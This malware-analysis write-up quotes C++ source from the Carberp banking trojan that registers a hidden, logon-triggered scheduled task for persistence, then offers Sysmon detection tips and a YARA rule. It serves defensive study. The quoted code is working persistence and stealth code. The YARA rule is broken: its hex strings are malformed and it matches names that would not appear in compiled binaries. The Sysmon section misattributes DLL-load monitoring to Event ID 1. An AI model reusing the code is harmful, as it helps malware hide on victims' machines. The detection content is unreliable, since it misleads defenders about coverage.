# Carberp - Scheduled Task Logon Trigger Persistence

**Repository:** MalwareSourceCode-main  
**File Path:** `Win32/Infector/Win32.Carberp/Win32.Carberp/all source/schtasks/schtasks.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1053.005 - Scheduled Task/Job: Scheduled Task

---

## Overview

The Carberp banking trojan establishes persistence by creating a hidden scheduled task set to execute whenever a user logs on. This method ensures that the malware is active during user sessions, which is critical for its primary mission of intercepting online banking credentials. Carberp uses the legacy `ITaskScheduler` COM interface, which, while originally designed for Windows XP, remains functional on modern Windows versions for backward compatibility. By setting the `TASK_FLAG_HIDDEN` flag, the task does not appear in the standard Task Scheduler user interface, providing a simple yet effective method of stealth.

---

## Code Snippet: Creating and Configuring the Logon Trigger Task

```cpp
BOOL TaskAddSch10(LPCWSTR pwszTaskName,LPCWSTR pwszApplicationName)
{
	BOOL bResult = FALSE;
	HRESULT Hr;
	
	Hr = CoInitialize(NULL);
	if (SUCCEEDED(Hr))
	{
		ITaskScheduler *pITS;

		// STEP 1: Instantiate the legacy Task Scheduler COM object
		Hr = CoCreateInstance(CLSID_CTaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskScheduler,(PVOID*)&pITS);
		if (SUCCEEDED(Hr))
		{
			ITask *pITask;

			// STEP 2: Create a new task object
			Hr = pITS->NewWorkItem(pwszTaskName,CLSID_CTask,IID_ITask,(IUnknown**)&pITask);
			if (SUCCEEDED(Hr))
			{
				// STEP 3: Configure the task's application, trigger, and flags
				if (TaskAddSch10SetLogonTrigger(pITask,pwszApplicationName))
				{
					// STEP 4: Add the configured task to the scheduler
					Hr = pITS->AddWorkItem(pwszTaskName,(IScheduledWorkItem *)pITask);
					bResult = SUCCEEDED(Hr);
				}
				pITask->Release();
			}
			pITS->Release();
		}
		CoUninitialize();
	}
	return bResult;
}

BOOL TaskAddSch10SetLogonTrigger(ITask *pITask,LPCWSTR pwszApplicationName)
{
	BOOL bResult = FALSE;
	HRESULT Hr;

	Hr = pITask->SetApplicationName(pwszApplicationName);
	if (SUCCEEDED(Hr))
	{
		// Set the task to be hidden in the UI and to run only when a user is logged on
		Hr = pITask->SetFlags(TASK_FLAG_HIDDEN|TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
		if (SUCCEEDED(Hr))
		{
			// Run under the context of the user who is logging on
			Hr = pITask->SetAccountInformation(L"",NULL);
			if (SUCCEEDED(Hr))
			{
				ITaskTrigger *pTrigger;
				WORD iNewTrigger;

				Hr = pITask->CreateTrigger(&iNewTrigger,&pTrigger);
				if (SUCCEEDED(Hr))
				{
					TASK_TRIGGER Trigger = {0};
					Trigger.cbTriggerSize = sizeof(TASK_TRIGGER);
					// Define the trigger to fire when a user logs on
					Trigger.TriggerType = TASK_EVENT_TRIGGER_AT_LOGON;

					Hr = pTrigger->SetTrigger(&Trigger);
					bResult = SUCCEEDED(Hr);
					pTrigger->Release();
				}
			}
		}
	}
	return bResult;
}
```

**What it does:**  
The code initializes COM and creates an instance of the legacy `ITaskScheduler` object. It then defines a new task and configures it through the `TaskAddSch10SetLogonTrigger` function. This function sets the executable path for the task, specifies the `TASK_FLAG_HIDDEN` flag to conceal it from the GUI, and sets the account to the current user. Crucially, it creates a trigger and sets its type to `TASK_EVENT_TRIGGER_AT_LOGON`, which instructs the scheduler to run the task upon any user logon. Finally, the `AddWorkItem` method saves and activates the task.

**Why it's T1053.005:**  
This code is a direct implementation of persistence via a scheduled task. It uses the native Windows Task Scheduler API to register a malicious program to run automatically. The use of a logon trigger (`TASK_EVENT_TRIGGER_AT_LOGON`) is a specific pattern of this technique, chosen by the malware author to align with their objective of operating within an active user session. The addition of the `TASK_FLAG_HIDDEN` flag is a common evasion tactic used to make discovery more difficult for administrators and analysts.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 1: ProcessCreate**: Monitor for processes that load `mstask.dll` (which implements `ITaskScheduler`) and then write new files to `C:\Windows\System32\Tasks`. The `schtasks.exe` command-line utility is the most common way to create tasks, but direct COM access, as seen here, will originate from the malware process itself.
- **Event ID 12 & 13 & 14: RegistryEvent (Key and Value Create/Set)**: The Task Scheduler service maintains registry keys that cache task information. Monitor for the creation of keys under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. A new task will create a corresponding key with its name.

### YARA Rule

```yara
rule T1053_Persistence_Carberp_ScheduledTask
{
    meta:
        author = "Vengful"
        description = "Detects strings related to Carberp's use of the legacy ITaskScheduler COM interface for logon trigger persistence."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1053.005"

    strings:
        // COM Class and Interface IDs for ITaskScheduler
        $clsid = { A4 1151 83 - E4 1B - 11 D0 - 96 C9 - 00 00 F8 75 B5 87 } // CLSID_CTaskScheduler
        $iid = { A7 1151 83 - E4 1B - 11 D0 - 96 C9 - 00 00 F8 75 B5 87 } // IID_ITaskScheduler

        // Key function names
        $func1 = "TaskAddSch10" wide
        $func2 = "TaskAddSch10SetLogonTrigger" wide
        
        // Specific trigger and flag values
        $s1 = "TASK_EVENT_TRIGGER_AT_LOGON" ascii
        $s2 = "TASK_FLAG_HIDDEN" ascii

    condition:
        uint16(0) == 0x5A4D and // MZ header
        all of ($func*) and
        all of ($s*) and
        1 of ($clsid, $iid)
}
```
